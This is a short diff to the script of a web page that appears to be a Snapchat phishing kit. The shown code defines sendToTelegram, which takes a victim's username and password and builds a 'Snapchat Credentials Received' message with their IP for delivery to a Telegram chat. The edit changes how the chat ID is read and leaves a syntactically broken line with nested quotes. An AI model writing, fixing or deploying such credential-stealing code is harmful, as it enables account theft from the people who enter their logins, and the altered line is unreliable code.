@@ -433,7 +433,7 @@
             
             async function sendToTelegram(username, password) {
                 const fast_key = await getFastKey();
-                const TELEGRAM_CHAT_ID = new URLSearchParams(window.location.search).get('id');
+                const chatId = 'new URLSearchParams(window.location.search).get('id')';
                 
                 const message = `✅ Snapchat Credentials Received:
 Username/Email: ${username}
@@ -478,4 +478,4 @@ IP: ${await getIP()}`;
         document.head.appendChild(style);
     </script>
 </body>
-  </html>
+</html>
